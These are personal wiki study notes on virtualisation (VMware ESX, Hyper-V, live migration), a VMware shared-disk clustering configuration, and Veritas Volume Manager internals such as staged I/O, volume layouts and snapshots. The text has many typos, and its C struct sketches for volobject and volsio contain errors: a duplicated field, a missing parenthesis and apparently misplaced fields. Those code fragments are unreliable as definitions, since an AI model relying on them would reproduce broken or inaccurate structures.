Its virtualiation inside a single OS. Each process is provided a virutalised environment in which it can work. The virtualistaion environment would have different filesystem namespaces, devices and other stuff.  It provides best performance as native. 
Also called namespace-virtualisation os-level virtualisation, kernel-level virtualistaion, virtual environments, os partitioning, partitions, soft-partitions, compartmentalistaion, virtual private servers, light-weight virtualistaion. 

Some of the implementations of this virtualistaion are FreeBSD jails, Solaris Containers, Solaris Zones, AIX micro-partitions, HP vPars, Linux VServer, Linuc OpenVZ, Virtuozzo

!Application ABI Virtualisation
Since this is at application, it does not require modifying OS. Filter drivers intercept and alter all path specifiers relevant to I/O. Provides different namespaces, different copies of recources. 

Some of the implementations are Altiris SVS and Microsoft Softgrid. 

!Vmware ESX
hypervisor runs on physical machine called vmkernel. Driviers are directly included in the hypervisor, because of which it only supported small list of enterprise class hardware. 
Each VM is managed by Virtual Machine Monitor, which monitors the address space of the virtual machine and also just-in-compilations of virtual machine x86 code. 
Linux VM called Console OS provides management interface. 
ESX 3i puts the hypervisor on flash memory.

!Live Migration
Live Migration allows an application running in an guest OS to be migrated to naother guest on a different physical server with very little downtime ( less than a second ). 
During live migration the hypervisor on the first server moves the non-dirty pages on to the other hypervisor, and then tries to move dirty pages. It keeps trying this in a loop until it has very little pages to move, then it would perform the switch. The time delay is the delay in copying the last few pages. 
Vmware calls this feature as VMotion. 

!Microsoft Hyper-V
The architecture is similar to Xen. Similar to Xen's Dom0, windows calls it as Parent Partition. It is privileged virtual machine that manages other VMs and contains the drivers for physical devices. All the physical pages are directly get mapped to this VM's pages when required. 
Rest of the virtual machines have child partitions (similar to DomU's in Xen).

!Viridan

3 components
#Hypervisor
#Vritualisation Stack
#Vritual Devices

''Virtual Machine Monitor'' (VMM) virtualises underlying hardware resources

Resource Virtualisaion Techniques
#Partitioning
#Time Sharing 
#Emulating

[img[images/virtualisation_architectures.jpg]]

Parents are arranged in a tree, parents manage children. Each parent contains a Virtualisation Stack, manages child's memory, manages virtual devices. In WSV there is only one parent.

Guests communicate with the hypervisor via hypercalls
#Hypervisor equivalent of system call
#Detected via ~CpuId
#Configured via MSR (Model Specific Register)

The hypervisor schedules cores. 

Partitions are the unit of containment, Virtual Machine (VM) refers to the partition and its state.
Guests are software that run in a partition, such as ''Guest OS''
''Virtual Processors (VP)'' correspond to logical processors 

''Physical System === Parition''
''Logical Processor === Virtual Processor''

Most guests expect physically contigous memory starting at zero.
#Not everybody can start at zero
#Contigous memory hard to find after boot

Guest physical Addresses to Host Physical Addresses via 2nd set of page tables (shadow page tables, done in software. Hypervisor maintains internal tables to convert from GPA to HPS (SPA). </pre>
</div>
<div title="Vmware Bugs" modifier="BhargavaKancherla" modified="200807071152" created="200807010721" changecount="2">
<pre>if ''shift,alt,ctrl,caps lock'' keys stop working  run 
{{{
# setxkbmap
}}}
on any terminal in X session</pre>
</div>
<div title="Vmware Shared Disks" modifier="BhargavaKancherla" modified="200807071157" created="200807021135" changecount="8">
<pre>!Configure Shared Disk Resources
The way to spoof your virtual machines into believing that they have access to shared disk resources. In my quest for clustering I found two resources on this, one was hideously outdated - but contained enough theory to help me out, The other was for version 4.5x and was missing one critical piece of data that is apparently now needed in ~VMWare Workstation 5.0. The key concepts here are that you just need to create SCSI controllers on both machines, and then provide directives that tell ~VMWare NOT to lock the disks when they are connected. This lets machines share disks, as long as all of the SCSI connection info is configured correctly. From there you just need to, obviously, make sure that the disks aren't busy trying to dynamically allocate size; i.e. the disks have to be fixed or each VM will see a different size, state, etc. 

The first thing you need to do is create some drives that you'll hook up to your machines. The best way to do this is to just create them with the wizard by 'adding' them to one of your machines, and then immediately removing them. Think of it as a virtual-hard-drive-egg-laying-chicken (or just think of it as a way to make virtual hard drives, if that's easier). To Proceed:

* Open up one of your ~VMs and Select VM | Settings from the menu. To add the drives just click Add and use the Wizard.
* The first drive will be your Quorum drive, and just needs to be a few hundred MB (200 MB will work fine - or .2GB).
* The wizard steps are as follows: Create a new virtual disk. Next. SCSI. Next. Disk Size = .x GB Then ensure that Allocate all disk space now is checked. Click Next. Browse out and drop the disks in a directory called ~SharedDisks (or something). And click the Advanced button. Make sure that Independent is checked. Then click Finish.
* Create as many disks as you want
* Then select each drive, and Remove it in the Hardware management thingy. We just needed to MAKE Hard Drives, we don't want to add them just now. (You'll add them by hand to the machines in a second.)

!Attaching Shared Disks
Add your virtual shared drives to the boxes by hand. Now that the drives are sized and created, it's time to head to the virtual server rack and hook up some virtual SCSI controllers.

* Navigate to the directories where your Virtual Machines are kept, and for Server 1 open the .vmx file in ~NotePad.
* First add some instructions for disk control, and to make sure that the VM won't attempt to lock the drives it connects to:

{{{
    # Shared Disk Config Info:
      diskLib.dataCacheMaxSize = &quot; 0&quot;
      diskLib.dataCacheMaxReadAheadSize = &quot; 0&quot;
      diskLib.dataCacheMinReadAheadSize = &quot;0&quot; 
      diskLib.dataCachePageSize = &quot;4096&quot;
      diskLib.maxUnsyncedWrites = &quot;0&quot; 
      disk.locking = &quot;FALSE&quot;
}}}

* Then add a new SCSI controller:

{{{
      scsi1.present = &quot;TRUE&quot;
      scsi1.virtualDev = &quot;lsilogic&quot;
      scsi1.sharedBus = &quot;virtua&quot; 
}}}

* Once that's done, add your Quorum Drive (making sure to specify that the drive itself uses the lsilogic bus (this was the big missing component between Karl's post for 4.5x and 5.0. I found this out by trial and error):

{{{
      scsi1:1.present = &quot;TRUE&quot;
      scsi1:1.fileName = &quot;\Quorum.vmdk&quot;
      scsi1:1.redo = &quot;&quot;
      scsi1:1.mode = &quot;independent-persistent&quot;
      scsi1:1.deviceType = &quot;disk&quot;
      scsi1:1.virtualDev = &quot;lsilogic&quot;
}}}

Once the first controller and drive is added, just add the second SCSI controller and disk (making sure to change your paths, etc.:

{{{
      scsi1:2.present = &quot;TRUE&quot;
      scsi1:2.fileName = &quot;\Resource.vmdk&quot;
      scsi1:2.virtualDev = &quot;lsilogic&quot;
      scsi1:2.redo = &quot;&quot;
      scsi1:2.mode = &quot;independent-persistent&quot;
      scsi1:2.deviceType = &quot;disk&quot;
}}}

The entire 'snippet' to copy/paste is here:
{{{
      # Shared Disk Config Info:
      diskLib.dataCacheMaxSize = &quot;0&quot;
      diskLib.dataCacheMaxReadAheadSize = &quot;0&quot;
      diskLib.dataCacheMinReadAheadSize = &quot;0&quot;
      diskLib.dataCachePageSize = &quot;4096&quot;
      diskLib.maxUnsyncedWrites = &quot;0&quot;
      disk.locking = &quot;FALSE&quot;

      scsi1.present = &quot;TRUE&quot;
      scsi1.virtualDev = &quot;lsilogic&quot;
      scsi1.sharedBus = &quot;virtual&quot;
      scsi1:1.present = &quot;TRUE&quot;
      scsi1:1.fileName = &quot;\Quorum.vmdk&quot;
      scsi1:1.redo = &quot;&quot;
      scsi1:1.mode = &quot;independent-persistent&quot;
      scsi1:1.deviceType = &quot;disk&quot;
      scsi1:1.virtualDev = &quot;lsilogic&quot;

      scsi1:2.present = &quot;TRUE&quot;
      scsi1:2.fileName = &quot;\Resource.vmdk&quot;
      scsi1:2.virtualDev = &quot;lsilogic&quot;
      scsi1:2.redo = &quot;&quot;
      scsi1:2.mode = &quot;independent-persistent&quot;
      scsi1:2.deviceType = &quot;disk&quot;
}}}

Make sure, of course, that you specify the full path to your shared Drives directory. 

!Ensure Drive connectivity from both Servers.

* Power down BOTH of your server nodes.
* Power up BOTH of your server nodes
* You should see your new drives available
</pre>
</div>
<div title="VxSS" modifier="BhargavaKancherla" modified="200807151042" created="200807151026" changecount="7">
<pre>''~VxSS'' or ''~VxAT'' or AT are ''Symantec Product Authentication Service''

Provides single signon for DCMG products like 
* CC Storage
* CMC 5.0
* ~MicroMeasure
* ~SFMs
* VAD
* VBR
* VEA
* VPAS (PAM)

[img[images/VxAT.png]]

Plugins in Authentication broker supported are NIS, NIS+, Unix Password, LDAP, GSSAPI&lt; PAM, RSA Secure ID, NT.

[img[images/VxAT.client.png]]

</pre>
</div>
<div title="VxVM" modifier="YourName" modified="200811221534" created="200811220434" changecount="11">
<pre>!Daemons
* vxconfigd - The VxVM configuration daemon maintains disk and group configurations and communicates configuration changes to the kernel, and modifies configuration information stored on disks.
* vxiod - VxVM I/O kernel threads provide extended I/O operations without blocking calling processes. By default, 16 I/O threads are started at boot time, and at least one I/O thread must continue to run at all times.
* vxrelocd - The hot-relocation daemon monitors VxVM for events that affect redundancy, and performs hot-relocation to restore redundancy.

!Drivers
* VxVM Drivers:
** vxspec : Responsible for configuration changes, gathering statistics, monitoring tasks, starting kernel daemons etc.
** vxio : Is the first entry point for reading and writing VxVM volumes. All logical processing of IO operations initiates here.
** vxdmp : Is a multipathing driver and its job is to find out the various paths to the device and establish a one to many relationship between disk media (dm) and disk access(da) names.
* Volume configuration service is the interface through which all changes to the volumes are performed. Vxconfigd daemon is the sole and exclusive owner of these devices.
* Currently 8 volume conf devices exist.
** /dev/vx/[config,trace,iod,info,task,taskmon,clust,netiod].
* All these devices are character devices with major no of vxspec driver.
* All virtual disk devices (Volumes) are character and block devices with major no. of vxio driver.

[img[images/vxvm.arch.png]]

!Volobject
It is a representation of all Volumes and their infrastructure that are visible to users and applications. These are kept inside kernel space. These are created once a volume is created (not always). All volobjects has their associated operation vectors that gets activated once operations are done, either by applications or vxconfigd. Volobjects are created, deleted or changed within transactions only.

Some volobjects types that are predefined in VxVM :
* Mirrored Volume (Default one). It has vol_mv_ops as Operation Vector
* Plexes. It has volplex_ops as OV.
* Subdisks. It has vol_subdisk_ops as OV.
* RVG (Replicated Volume Group) for VVR. OV is vol_rv_ops.
* Replica Object. OV is vol_rp_ops.
* Volume set. OV is vol_vset_ops. 
{{{
struct volobject {
	struct volobjectops * obj_ops;
	struct volobject *obj_name;
	struct volobject *obj_forw_sib;
	struct voldg *obj_dg;
	char *obj_name;
	volflag_t obj_flags;
	volflag_t obj_trans_flags;
	size_t obj_openrefcnt;
	size_t obj_iocount;
	struct vol_rwstats obj_stats
	struct voldevice *obj_vdev;
	volsleep_t obj_openclose;
}

struct volobjectops {
	char *oop_type;
	struct volsio * (*oop_iogen)();
	int (*oop_open)();
	int (*oop_close)();
	int (*oop_ioctl)();
	int (*oop_size)();
	int (*oop_voldget)();
	int (*oop_stats)();
	int (*oop_precommit();
	int (*oop_postcommit)();
	struct voldevice *obj_vdev;
	volsleep_t obj_openclose;
}
}}}

!Staged I/O
An IO over a virtual object may in turn depend on IO over some other underlying virtual objects. Underlying virtual objects themselves handle the required operations and let the top level IO object to know the result. In this scenario the top level IO operation is broken in multiple stages where each stage also represent an IO. IO at each stage is known as SIO (Staged IO)
* SIOs are formed as a concatenation of volsio structure with any additional information needed for handling the IO.
* SIOs do not have one-to-one correspondence with KIO(Kernel I/O).
* SIOs have a hierarchical relationship.
{{{
struct volsio {
struct volsioops 	*sio_ops;
struct volsio	*sio_next;
struct volsio	*sio_forw;
struct volsio	*sio_parent;
struct volsio	*sio_object;
volkio_t		*sio_kio;
voff_t		sio_len;
volflag_t		sio_flags;
voff_t		sio_buff_offset;
voff_t		sio_offset;
int			sio_errno;
struct volsio	*sio_child;
struct volsio	*sio_sibnext;
}

struct volsioops {
	char sop_type[16];
	int (*sop_start)();
	int (*sop_childdone)();
	int (*sop_done)();
	int (*sop_callback)();
	void (*sop_delete)();
}
}}}
* All the SIOs are generated from volobject's oop_iogen() function. 
* Mostly SIOs are picked by IO daemons from global SIO queues. IO daemons operate on three main SIO queues.
** volsioq_start : Queue of SIOs that need to be started.
** volsioq_idle_start : Queue of SIOs which can wait until the other queues are handled.
** volsioq_done : Queue of sios that are to be completed.
** volsioq_restart : Queue of SIOs to start later.
** volsioq_redone : Queue of SIO completions to be processed later.

!I/O path
* Character type Virtual Devices :
** read, write are done through vxio_read(), vxio_write() and vxio_ioctl() routines.
** No IO buffer is passed through, instead user io or uio gets passed.
** Since IO buffer is not passed so it uses uphysio() to call volstrategy function.
* Block type Virtual Devices :
** read, write are done through vxio_strategy and vxio_ioctl.
** vxio_strategy internally calls volstrategy routine.
** IO buffers are sent as chain of &quot;bp&quot;s to volstrategy. Chained via the av_forw field.
** volstrategy internally Calls volkiostart (for each buffer in the bp chain) to start the actual processing of IO. 

[img[images/vxvm.arch.2.png]]

!!!Kernel I/O (KIO)
* It is a representation of buf struct.
* It defines a virtual disk device, IO direction, an offset within the device, length and source and destination memory.
* KIO is not an SIO. Though KIO is mostly reponsible for SIO.

!!!Generic I/O (GIO)
* This is an intermediate structure and is purely responsible for creating a staged IO (SIO).
* volkiostart() creates GIO and calls volobject_iogen() to generate the corresponding SIO.
* volobject_iogen calls oop_iogen of the volobject that is kept in GIO.	
!!!voliod_loop()
* It is an volume iodaemon loop. It checks the various queues for SIO and KIO processing and either go to sleep or work.
* Process global queues : volsioq_done, volsioq_start, volkioq_start, volsioq_idle_start, volsioq_restart() and volsio_redone().
* Gives priority to volsioq_done queue.
!!!voliod_iohandle()
* Call SIO's start or done  function
* If the return code is -1 then append to restartq or redoneq

!!!volkiostart()
* IO processing starts here only.
* It gets buf (volkio or kio) and kernel context.
* Extract volobject based on the devno present in kio.
* CheckVV if it is not in Interrupt context. If yes then put kio into volkioq_start queue and wakeup an iodaemon.
* Check if transactions are going on. If yes then put into volkioq_commitwait_start queue.
* Construct genio (GIO) using volobject and kio.
* Get the sio by calling volobject_iogen().
* Once sio is generated put the kio pointer in SIO.
* Append the SIO in kernel contexts kc_startq.
* If it is a fresh SIO then call its start function
* By this time multiple child or nested SIOs might be appended in kc_startq.
* Flush kc_startq, kc_doneq and kc_idle_startq.
* Appends its entries in volsioq_start, volsioq_done and volsioq_idle_startq. 
* Wakeup IO Daemon.

!I/O Stabilisation
* In some OS it is possible that the application process which has issued an IO request could have the pages mmaped and could change the contents while the IO request is in flight.
* Stabilization is basically achieved by allocating a new IO buffer of same size, and IO operations will use the new buffer. Sometimes OS ensures stable buffers. 
* Mirror volumes may have multiple plexes and it is quite possible that if the IO buffer is not stable then same data will not be written in all the plexes.
* VxIO ensures that before writing to plexes it creates the copy of the original buffer and writes the data from the copied buffer.
* volsio_stabilize()
** Sets the flag VOLKIO_FLAG_STABLE.
** Copies Original Kernel IO buffers to the newly allocated buffer.
** Update SIO structure to use newly allocated KIO.
** Sets the flag VOLSIO_FLAG_STABILIZED
* volsio_unstablize()
** Should be called on an SIO who has called volsio_stabilize()
** Frees the newly allocated buffer.
** Updates SIO structure to use original KIO.
** Resets flag VOLSIO_FLAG_STABILIZED.


!DDL
Device discovery is the term used to describe the process of discovering the disks that are attached to a host. This feature is important for DMP because it needs to support a growing number of disk arrays from a number of vendors. In conjunction with the ability to discover the devices attached to a host, the Device Discovery service enables you to add support dynamically for new disk arrays. This operation, which uses a facility called the Device Discovery Layer (DDL), is achieved without the need for a reboot.

!Enclosure-based Naming
Enclosure-based naming allows VxVM to access enclosures as separate physical entities.

[img[images/enclosure.png]]

In such a configuration, enclosure-based naming can be used to refer to each disk within an enclosure. For example, the device names for the disks in enclosure enc0 are named enc0_0, enc0_1, and so on.

!Objects

Virtual objects in VxVM include the following:
* Disk groups
* VM disks
* Subdisks
* Plexes
* Volumes

!!VM Disk
When you place a physical disk under VxVM control, a VM disk is assigned to the physical disk. A VM disk is under VxVM control and is usually in a disk group. Each VM disk corresponds to at least one physical disk or disk partition. VxVM allocates storage from a contiguous area of VxVM disk space.
A VM disk typically includes a public region (allocated storage) and a small private region where VxVM internal configuration information is stored.
Each VM disk has a unique disk media name (a virtual disk name). You can either define a disk name of up to 31 characters, or allow VxVM to assign a default name that takes the form diskgroup##, where diskgroup is the name of the disk group to which the disk belongs.

!!Subdisks
A subdisk is a set of contiguous disk blocks. A block is a unit of space on the disk. VxVM allocates disk space using subdisks. A VM disk can be divided into one or more subdisks. Each subdisk represents a specific portion of a VM disk, which is mapped to a specific region of a physical disk.
The default name for a VM disk is diskgroup## and the default name for a subdisk is diskgroup##-##, where diskgroup is the name of the disk group to which the disk belongs.

!!Plexes
VxVM uses subdisks to build virtual objects called plexes. A plex consists of one or more subdisks located on one or more physical disks.

[img[images/plex.png]]

You can organize data on subdisks to form a plex by using the following methods:
Understanding Veritas Volume Manager 31
How VxVM handles storage management
* concatenation
* striping (RAID-0)
* mirroring (RAID-1)
* striping with parity (RAID-5)

!!Volumes
A volume is a virtual disk device that appears to applications, databases, and file systems like a physical disk device, but does not have the physical limitations of a physical disk device. A volume consists of one or more plexes, each holding a copy of the selected data in the volume. Due to its virtual nature, a volume is not restricted to a particular disk or a specific area of a disk. The configuration of a volume can be changed by using VxVM user interfaces.

VxVM uses the default naming conventions of vol## for volumes and vol##-## for plexes in a volume.

A volume may be created under the following constraints:
* Its name can contain up to 31 characters.
* It can consist of up to 32 plexes, each of which contains one or more subdisks.
* It must have at least one associated plex that has a complete copy of the data in the volume with at least one associated subdisk.
* All subdisks within a volume must belong to the same disk group.

[img[images/mirrored.plex.png]]

Volume vol06 has the following characteristics:
* It contains two plexes named vol06-01 and vol06-02.
* Each plex contains one subdisk.
* Each subdisk is allocated from a different VM disk (disk01 and disk02).

!Volume Layout
A VxVM virtual device is defined by a volume. A volume has a layout defined by the association of a volume to one or more plexes, each of which map to subdisks. A VxVM virtual device is defined by a volume. A volume has a layout defined by the association of a volume to one or more plexes, each of which map to subdisks.

!!!For non-layered volumes
In a non-layered volume, a subdisk is restricted to mapping directly to a VM disk. This allows the subdisk to define a contiguous extent of storage space backed by the public region of a VM disk. When active, the VM disk is directly associated with an underlying physical disk. The combination of a volume layout and the physical disks therefore determines the storage service available from a given virtual device.

!!!For Layered volumes
A layered volume is constructed by mapping its subdisks to underlying volumes. The subdisks in the underlying volumes must map to VM disks, and hence to attached physical storage.

!!!Layout Methods
Data in virtual objects is organized to create volumes by using the following layout methods:
* Concatenation and spanning
* Striping (RAID-0)
* Mirroring (RAID-1)
* Striping plus mirroring (mirrored-stripe or RAID-0+1)
* Mirroring plus striping (striped-mirror, RAID-1+0 or RAID-10)
* RAID-5 (striping with parity)

Concatenation maps data in a linear manner onto one or more subdisks in a plex. To access all of the data in a concatenated plex sequentially, data is first accessed in the first subdisk from beginning to end. Concatenation using subdisks that reside on more than one VM disk is called spanning.

Striping (RAID-0) is useful if you need large amounts of data written to or read from physical disks, and performance is important. Striping maps data so that the data is interleaved among two or more physical disks. A striped plex contains two or more subdisks, spread out over two or more physical disks. Data is allocated alternately and evenly to the subdisks of a striped plex. The default stripe unit size (or width) is 64 kilobytes. Striping continues for the length of the columns (if all columns are the same length), or until the end of the shortest column is reached. Any space remaining at the end of subdisks in longer columns becomes unused space.
Each column contains a different number of subdisks. There is one column per physical disk. Striped plexes can be created by using a single subdisk from each of the VM disks being striped across. It is also possible to allocate space from different regions of the same disk or from another disk (for example, if the size of the plex is increased). Columns can also contain subdisks from different VM disks.

[img[images/striped.plex.png]]

[question why is it required that subdisks for striped plex come from different vm disks]

Mirroring uses multiple mirrors (plexes) to duplicate the information contained in a volume. In the event of a physical disk failure, the plex on the failed disk becomes unavailable, but the system continues to operate using the unaffected mirrors.
When striping or spanning across a large number of disks, failure of any one of those disks can make the entire plex unusable. Because the likelihood of one out of several disks failing is reasonably high, you should consider mirroring to improve the reliability (and availability) of a striped or spanned volume.

VxVM supports the combination of mirroring above striping. The combined layout is called a mirrored-stripe layout. A mirrored-stripe layout offers the dual benefits of striping to spread data across multiple disks, while mirroring provides redundancy of data.
For mirroring above striping to be effective, the striped plex and its mirrors must be allocated from separate disks.
The layout type of the data plexes in a mirror can be concatenated or striped. Even if only one is striped, the volume is still termed a mirrored-stripe volume. If they are all concatenated, the volume is termed a mirrored-concatenated volume.

[img[images/mirrored.stripe.png]]

VxVM supports the combination of striping above mirroring. This combined layout is called a striped-mirror layout. Putting mirroring below striping mirrors each column of the stripe. If there are multiple subdisks per column, each subdisk can be mirrored individually instead of each column.
A striped-mirror volume is an example of a layered volume. See Layered volumes on page 50 for more information.
As for a mirrored-stripe volume, a striped-mirror volume offers the dual benefits of striping to spread data across multiple disks, while mirroring provides redundancy of data. In addition, it enhances redundancy, and reduces recovery time after disk failure.
Figure 1-19 shows an example where a striped-mirror volume is created by using each of three existing 2-disk mirrored volumes to form a separate column within a striped plex.
If the layered volume concatenates instead of striping the underlying mirrored volumes, the volume is termed a concatenated-mirror volume.

[img[images/striped.mirror.png]]

Note: VxVM supports RAID-5 for private disk groups, but not for shareable disk groups in a cluster environment. In addition, VxVM does not support the mirroring of RAID-5 volumes that are configured using Veritas Volume Manager software. Disk devices that support RAID-5 in hardware may be mirrored.

!!!!RAID-5 logging
Logging is used to prevent corruption of data during recovery by immediately recording changes to data and parity to a log area on a persistent device such as a volume on disk or in non-volatile RAM. The new data and parity are then written to the disks.
Without logging, it is possible for data not involved in any active writes to be lost or silently corrupted if both a disk in a RAID-5 volume and the system fail. If this double-failure occurs, there is no way of knowing if the data being written to the data portions of the disks or the parity being written to the parity portions have actually been written. Therefore, the recovery of the corrupted disk may be corrupted itself.

!!!Layered Volume
A layered volume is a virtual Veritas Volume Manager object that is built on top of other volumes. The layered volume structure tolerates failure better and has greater redundancy than the standard volume structure. For example, in a striped-mirror layered volume, each mirror (plex) covers a smaller area of storage space, so recovery is quicker than with a standard mirrored volume.

[img[images/layered.volume.png]]

!Online Relayout
Online relayout allows you to convert between storage layouts in VxVM, with uninterrupted data access. 
The transformation is done by moving one portion of data at a time in the source layout to the destination layout. Data is copied from the source volume to the temporary area, and data is removed from the source volume storage area in portions.The source volume storage area is then transformed to the new layout, and the data saved in the temporary area is written back to the new layout. This operation is repeated until all the storage and data in the source volume has been transformed to the new layout.
As well as the temporary area, space is required for a temporary intermediate volume when increasing the column length of a striped volume. The amount of space required is the difference between the column lengths of the target and source volumes. For example, 20GB of temporary additional space is required to relayout a 150GB striped volume with 5 columns of length 30GB as 3 columns of length 50GB. In some cases, the amount of temporary space that is required is relatively large. For example, a relayout of a 150GB striped volume with 5 columns as a concatenated volume (with effectively one column) requires 120GB of space for the intermediate volume.

Limitations of online relayout
Note the following limitations of online relayout:
* Log plexes cannot be transformed.
* Volume snapshots cannot be taken when there is an online relayout operation running on the volume.
* Online relayout cannot create a non-layered mirrored volume in a single step. It always creates a layered mirrored volume even if you specify a non-layered mirrored layout, such as mirror-stripe or mirror-concat. Use the vxassistconvert command to turn the layered mirrored volume that results from a relayout into a non-layered volume. See Converting between layered and non-layered volumes on page 308 for more information.
* Online relayout can be used only with volumes that have been created using the vxassist command or the Veritas Enterprise Administrator (VEA).
* The usual restrictions apply for the minimum number of physical disks that are required to create the destination layout. For example, mirrored volumes require at least as many disks as mirrors, striped and RAID-5 volumes require at least as many disks as columns, and striped-mirror volumes require at least as many disks as columns multiplied by mirrors.
* To be eligible for layout transformation, the plexes in a mirrored volume must have identical stripe widths and numbers of columns. Relayout is not possible unless you make the layouts of the individual plexes identical.
* Online relayout involving RAID-5 volumes is not supported for shareable disk groups in a cluster environment.
* Online relayout cannot transform sparse plexes, nor can it make any plex sparse. (A sparse plex is not the same size as the volume, or has regions that are not mapped to any subdisk.)
* The number of mirrors in a mirrored volume cannot be changed using relayout.
* Only one relayout may be applied to a volume at a time.

!Volume resynchronization
When storing data redundantly and using mirrored or RAID-5 volumes, VxVM ensures that all copies of the data match exactly. However, under certain conditions (usually due to complete system failures), some redundant data on a volume can become inconsistent or unsynchronized. The mirrored data is not exactly the same as the original data. Except for normal configuration changes (such as detaching and reattaching a plex), this can only occur when a system crashes while data is being written to a volume.

VxVM records when a volume is first written to and marks it as dirty. When a volume is closed by all processes or stopped cleanly by the administrator, and all writes have been completed, VxVM removes the dirty flag for the volume. Only volumes that are marked dirty when the system reboots require resynchronization.

The process of resynchronization depends on the type of volume. RAID-5 volumes that contain RAID-5 logs can replay those logs. If no logs are available, the volume is placed in reconstruct-recovery mode and all parity is regenerated. For mirrored volumes, resynchronization is done by placing the volume in recovery mode (also called read-writeback recovery mode).

For large volumes or for a large number of volumes, the resynchronization process can take time. These effects can be addressed by using dirty region logging (DRL) and FastResync (fast mirror resynchronization) for mirrored volumes, or by ensuring that RAID-5 volumes have valid RAID-5 logs. For raw volumes used by database applications, the SmartSync feature can be used if this is supported by the database vendor.

!!!Dirty Region Logging
Dirty region logging (DRL), if enabled, speeds recovery of mirrored volumes after a system crash. DRL keeps track of the regions that have changed due to I/ O writes to a mirrored volume. DRL uses this information to recover only those portions of the volume that need to be recovered.
DRL logically divides a volume into a set of consecutive regions, and maintains a log on disk where each region is represented by a status bit. This log records regions of a volume for which writes are pending. Before data is written to a region, DRL synchronously marks the corresponding status bit in the log as dirty. To enhance performance, the log bit remains set to dirty until the region becomes the least recently accessed for writes.

DRL log subdisks store the dirty region log of a mirrored volume that has DRL enabled. A volume with DRL has at least one log subdisk; multiple log subdisks can be used to mirror the dirty region log. Each log subdisk is associated with one plex of the volume. Only one log subdisk can exist per plex. If the plex contains only a log subdisk and no data subdisks, that plex is referred to as a log plex.
The log subdisk can also be associated with a regular plex that contains data subdisks. In that case, the log subdisk risks becoming unavailable if the plex must be detached due to the failure of one of its data subdisks.
Some volumes, such as those that are used for database replay logs, are written sequentially and do not benefit from delayed cleaning of the DRL bits. For these volumes, sequential DRL can be used to limit the number of dirty regions. This allows for faster recovery should a crash occur. However, if applied to volumes that are written to randomly, sequential DRL can be a performance bottleneck as it limits the number of parallel writes that can be carried out.

!!!Smartsync recovery accelerator
The SmartSync feature of Veritas Volume Manager increases the availability of mirrored volumes by only resynchronizing changed data. (The process of resynchronizing mirrored databases is also sometimes referred to as resilvering.) SmartSync reduces the time required to restore consistency, freeing more I/O bandwidth for business-critical applications. If supported by the database vendor, the SmartSync feature uses an extended interface between VxVM volumes and the database software to avoid unnecessary work during mirror resynchronization. For example, Oracle automatically takes advantage of SmartSync to perform database resynchronization when it is available.
The SmartSync feature of Veritas Volume Manager is only applicable to databases that are configured on raw volumes. You cannot use it with volumes that contain file systems. Use an alternative solution such as the Oracle Resilvering feature of Veritas File System (VxFS).

You must configure volumes correctly to use SmartSync. For VxVM, there are two types of volumes used by the database, as follows:
* Data volumes are all other volumes used by the database (control files and tablespace files).
* Redo log volumes contain redo logs of the database.
SmartSync works with these two types of volumes differently, so they must be configured as described in the following sections.

Because the database keeps its own logs, it is not necessary for VxVM to do logging. Data volumes should be configured as mirrored volumes without dirty region logs. 
A redo log is a log of changes to the database data. Because the database does not maintain changes to the redo logs, it cannot provide information about which sections require resilvering.The enhanced interfaces for redo logs allow the database software to inform VxVM when a volume is to be used as a redo log. This allows VxVM to modify the DRL behavior of the volume to take advantage of the access patterns.

!Volume Snapshots
The traditional type of volume snapshot in VxVM is of the third-mirror break-off type. This name comes from its implementation where a snapshot plex (or third mirror) is added to a mirrored volume. The contents of the snapshot plex are then synchronized from the original plexes of the volume. When this synchronization is complete, the snapshot plex can be detached as a snapshot volume for use in backup or decision support applications. At a later time, the snapshot plex can be reattached to the original volume, requiring a full resynchronization of the snapshot plexs contents. 
The FastResync feature was introduced to track writes to the original volume. This tracking means that only a partial, and therefore much faster, resynchronization is required on reattaching the snapshot plex. In later releases, the snapshot model was enhanced to allow snapshot volumes to contain more than a single plex, reattachment of a subset of a snapshot volumes plexes, and persistence of FastResync across system reboots or cluster restarts.

Release 4.0 of VxVM introduced full-sized instant snapshots and space-optimized instant snapshots, which offer advantages over traditional third-mirror snapshots such as immediate availability and easier configuration and administration. You can also use the third-mirror break-off usage model with full-sized snapshots, where this is necessary for write-intensive applications

|Snapshot feature |Full-sized instant (vxsnap) |Space-optimized instant (vxsnap) |Break-off (vxassist or vxsnap)|
|Immediately available for use on creation |Yes |Yes |No|
|Requires less storage space than original volume |No |Yes |No|
|Can be reattached to original volume |Yes |No |Yes|
|Can be used to restore contents of original volume |Yes |Yes |Yes|
|Can quickly be refreshed without being reattached |Yes |Yes |No|
|Snapshot hierarchy can be split |Yes |No |No|
|Can be moved into separate disk group from original volume |Yes |No |Yes|
|Can be turned into an independent volume |Yes |No |Yes|
|FastResync ability persists across system reboots or cluster restarts |Yes |Yes |Yes|
|Synchronization can be controlled|Yes|No| No|

!Fast Resync
FastResync optimizes mirror resynchronization by keeping track of updates to stored data that have been missed by a mirror. When a mirror returns to service, only the updates that it has missed need to be re-applied to resynchronize it.
FastResync allows you to refresh and re-use snapshots rather than discard them. You can quickly re-associate (snapback) snapshot plexes with their original volumes.

Non-persistent FastResync allocates its change maps in memory. If non-persistent FastResync is enabled, a separate FastResync map is kept for the original volume and for each snapshot volume. Unlike a dirty region log (DRL), they do not reside on disk nor in persistent store. This has the advantage that updates to the FastResync map have little impact on I/O performance, as no disk updates needed to be performed. However, if a system is rebooted, the information in the map is lost, so a full resynchronization is required on snapback. This limitation can be overcome for volumes in cluster-shareable disk groups, provided that at least one of the nodes in the cluster remained running to preserve the FastResync map in its memory. However, a node crash in a High Availability (HA) environment requires the full resynchronization of a mirror when it is reattached to its parent volume.

The snapshot feature of VxVM takes advantage of FastResync change tracking to record updates to the original volume after a snapshot plex is created. After a snapshot is taken, the snapback option is used to reattach the snapshot plex.

If persistent FastResync is enabled on a volume or on a snapshot volume, a data change object (DCO) and a DCO volume are associated with the volume.

!!!DCO volume
The internal layout of the DCO volume changed in VxVM 4.0 to support new features such as full-sized and space-optimized instant snapshots. Because the DCO volume layout is versioned, VxVM software continues to support the version 0 layout for legacy volumes. However, you must configure a volume to have a version 20 DCO volume if you want to take instant snapshots of the volume.

In VxVM release 3.2, the DCO object only managed information about the FastResync maps. These maps track writes to the original volume and to each of up to 32 snapshot volumes since the last snapshot operation. Each plex of the DCO volume on disk holds 33 maps, each of which is 4 blocks in size by default.

In VxVM 4.0 and later releases, the DCO object is used not only to manage the FastResync maps, but also to manage DRL recovery maps (see Dirty region logging on page 59) and special maps called copymaps that allow instant snapshot operations to resume correctly following a system crash. 

